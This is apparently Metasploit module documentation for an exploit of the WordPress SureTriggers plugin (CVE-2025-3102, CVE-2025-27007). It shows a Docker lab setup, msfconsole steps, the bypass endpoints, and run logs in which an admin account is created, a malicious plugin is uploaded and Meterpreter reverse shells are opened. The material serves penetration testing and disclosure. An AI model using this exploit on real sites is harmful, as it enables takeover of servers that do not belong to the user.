## Vulnerable Application

This Metasploit module exploits administrative user creation vulnerabilities in the
WordPress SureTriggers/OttoKit plugin:

* **CVE-2025-3102** (≤ 1.0.78): unauthenticated admin creation via the `automation/action`
REST endpoint with an empty `St-Authorization: Bearer` header.
* **CVE-2025-27007** (≤ 1.0.82): unauthenticated reset of the access key via the `connection/create-wp-connection` endpoint,
followed by admin creation using `St-Authorization: Bearer <NEW_KEY>`.

### To replicate vulnerable environments

1. **SureTriggers v1.0.78 (CVE-2025-3102)**

   * Download & install plugin v1.0.78:
     `https://downloads.wordpress.org/plugin/suretriggers.1.0.78.zip`
   * No additional setup is required; the bypass works immediately upon activation.

2. **SureTriggers v1.0.82 (CVE-2025-27007)**

   * Download & install plugin v1.0.82:
     `https://downloads.wordpress.org/plugin/suretriggers.1.0.82.zip`
   * No secret key is needed; the exploit will reset it to the specified value.

Both scenarios can be deployed via Docker Compose.

## Docker Compose Configuration

```yaml
services:

  wordpress:
    image: wordpress:6.3.2
    restart: always
    ports:
      - 5555:80
    environment:
      WORDPRESS_DB_HOST: db
      WORDPRESS_DB_USER: chocapikk
      WORDPRESS_DB_PASSWORD: dummy_password
      WORDPRESS_DB_NAME: exploit_market
    volumes:
      - wordpress:/var/www/html
      - ./custom.ini:/usr/local/etc/php/conf.d/custom.ini

  db:
    image: mysql:5.7
    restart: always
    environment:
      MYSQL_DATABASE: exploit_market
      MYSQL_USER: chocapikk
      MYSQL_PASSWORD: dummy_password
      MYSQL_ROOT_PASSWORD: dummy_password
    volumes:
      - db:/var/lib/mysql

volumes:
  wordpress:
  db:
```

Create a `custom.ini` file with:

```ini
upload_max_filesize = 64M
post_max_size = 64M
```

## Verification Steps

1. Start the environment:

```bash
docker-compose up -d
```
2. Complete WordPress setup at [http://localhost:5555](http://localhost:5555).
3. Confirm the targeted SureTriggers version is active under **Plugins**.
4. In `msfconsole`:

```bash
use exploit/multi/http/wp_suretriggers_auth_bypass
set RHOSTS 127.0.0.1
set TARGETURI /
set WP_USER eviladmin
set WP_PASS Str0ngP@ss!
set WP_EMAIL eviladmin@example.com
```

## Options

* **WP_USER**, **WP_PASS**, **WP_EMAIL**: New administrator credentials (random by default).
* **ST_AUTH**: *(Optional)* Value for `St-Authorization` header (used by CVE-2025-3102; default empty).
* **ACCESS_KEY**: *(Optional)* Key to reset for CVE-2025-27007 (random by default).
* **ACTION**: Exploit to perform:

  * `CVE-2025-3102`
  * `CVE-2025-27007`

## Scenarios

### CVE-2025-3102: Empty Bearer Admin Creation

1. Ensure SureTriggers v1.0.78 is active.
2. In `msfconsole`, set:

```bash
set ACTION CVE-2025-3102
```
3. Run the module: it will send an empty `St-Authorization: Bearer ` header to `/wp-json/sure-triggers/v1/automation/action`.
4. New administrator is created; payload is uploaded and executed.

### CVE-2025-27007: Reset Access Key & Admin Creation

1. Ensure SureTriggers v1.0.82 is active.
2. In `msfconsole`, set:

```bash
set ACTION CVE-2025-27007
```
3. Run the module: it will call `/wp-json/sure-triggers/v1/connection/create-wp-connection` to reset the key, then use
   `St-Authorization: Bearer mynewkey123` against `/wp-json/sure-triggers/v1/automation/action`.
4. New administrator is created; payload is uploaded and executed.


### Expected Results (CVE-2025-3102)

With `php/meterpreter/reverse_tcp`:

```plaintext
msf6 exploit(multi/http/wp_suretriggers_auth_bypass) > set action CVE-2025-3102
action => CVE-2025-3102
msf6 exploit(multi/http/wp_suretriggers_auth_bypass) > run http://lab:5555
[*] Started reverse TCP handler on 192.168.1.36:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Detected WordPress version: 6.8.1
[+] The target appears to be vulnerable. Detected suretriggers 1.0.78 vulnerable to CVE-2025-3102
[+] Admin created: warner:Q0bTyYI43H8g
[*] Uploading malicious plugin for code execution...
[*] Executing payload at /wp-content/plugins/wp_hkc1z/ajax_kq8xu.php...
[*] Sending stage (40004 bytes) to 172.27.0.3
[+] Deleted ajax_kq8xu.php
[+] Deleted wp_hkc1z.php
[+] Deleted ../wp_hkc1z
[*] Meterpreter session 6 opened (192.168.1.36:4444 -> 172.27.0.3:43702) at 2025-05-21 19:35:49 +0200

meterpreter > sysinfo
Computer    : 396e678f2510
OS          : Linux 396e678f2510 6.14.6-2-cachyos #1 SMP PREEMPT_DYNAMIC Sat, 10 May 2025 20:09:10 +0000 x86_64
Meterpreter : php/linux
```

With `cmd/linux/http/x64/meterpreter/reverse_tcp`:

```plaintext
msf6 exploit(multi/http/wp_suretriggers_auth_bypass) > set action CVE-2025-3102
action => CVE-2025-3102
msf6 exploit(multi/http/wp_suretriggers_auth_bypass) > set target 1
target => 1
msf6 exploit(multi/http/wp_suretriggers_auth_bypass) > set payload cmd/linux/http/x64/meterpreter/reverse_tcp
payload => cmd/linux/http/x64/meterpreter/reverse_tcp
msf6 exploit(multi/http/wp_suretriggers_auth_bypass) > run http://lab:5555
[*] Started reverse TCP handler on 192.168.1.36:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Detected WordPress version: 6.8.1
[+] The target appears to be vulnerable. Detected suretriggers 1.0.78 vulnerable to CVE-2025-3102
[+] Admin created: warner:Q0bTyYI43H8g
[*] Uploading malicious plugin for code execution...
[*] Executing payload at /wp-content/plugins/wp_xtndd/ajax_bmjl3.php...
[*] Sending stage (3045380 bytes) to 172.27.0.3
[+] Deleted ajax_bmjl3.php
[+] Deleted wp_xtndd.php
[+] Deleted ../wp_xtndd
[*] Meterpreter session 7 opened (192.168.1.36:4444 -> 172.27.0.3:35176) at 2025-05-21 19:36:44 +0200

meterpreter > sysinfo
Computer     : 172.27.0.3
OS           : Debian 12.10 (Linux 6.14.6-2-cachyos)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
```

### Expected Results (CVE-2025-27007)

With `php/meterpreter/reverse_tcp`:

```plaintext
msf6 exploit(multi/http/wp_suretriggers_auth_bypass) > set action CVE-2025-27007
action => CVE-2025-27007
msf6 exploit(multi/http/wp_suretriggers_auth_bypass) > run http://lab:5555
[*] Started reverse TCP handler on 192.168.1.36:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Detected WordPress version: 6.8.1
[+] The target appears to be vulnerable. Detected suretriggers 1.0.82 vulnerable to CVE-2025-27007
[*] Resetting access key
[+] Access key reset successful
[+] Admin created: warner:Q0bTyYI43H8g
[*] Uploading malicious plugin for code execution...
[*] Executing payload at /wp-content/plugins/wp_kbl7m/ajax_awg0f.php...
[*] Sending stage (40004 bytes) to 172.27.0.3
[+] Deleted ajax_awg0f.php
[+] Deleted wp_kbl7m.php
[+] Deleted ../wp_kbl7m
[*] Meterpreter session 4 opened (192.168.1.36:4444 -> 172.27.0.3:52622) at 2025-05-21 19:31:04 +0200

meterpreter > sysinfo
Computer    : 396e678f2510
OS          : Linux 396e678f2510 6.14.6-2-cachyos #1 SMP PREEMPT_DYNAMIC Sat, 10 May 2025 20:09:10 +0000 x86_64
Meterpreter : php/linux
```

With `cmd/linux/http/x64/meterpreter/reverse_tcp`:

```plaintext
msf6 exploit(multi/http/wp_suretriggers_auth_bypass) > set target 1
target => 1
msf6 exploit(multi/http/wp_suretriggers_auth_bypass) > set payload cmd/linux/http/x64/meterpreter/reverse_tcp
payload => cmd/linux/http/x64/meterpreter/reverse_tcp
msf6 exploit(multi/http/wp_suretriggers_auth_bypass) > run http://lab:5555
[*] Started reverse TCP handler on 192.168.1.36:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Detected WordPress version: 6.8.1
[+] The target appears to be vulnerable. Detected suretriggers 1.0.82 vulnerable to CVE-2025-27007
[*] Resetting access key
[+] Access key reset successful
[+] Admin created: warner:Q0bTyYI43H8g
[*] Uploading malicious plugin for code execution...
[*] Executing payload at /wp-content/plugins/wp_uozfu/ajax_cqg9q.php...
[*] Sending stage (3045380 bytes) to 172.27.0.3
[+] Deleted ajax_cqg9q.php
[+] Deleted wp_uozfu.php
[+] Deleted ../wp_uozfu
[*] Meterpreter session 5 opened (192.168.1.36:4444 -> 172.27.0.3:56038) at 2025-05-21 19:33:42 +0200

meterpreter > sysinfo
Computer     : 172.27.0.3
OS           : Debian 12.10 (Linux 6.14.6-2-cachyos)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
```
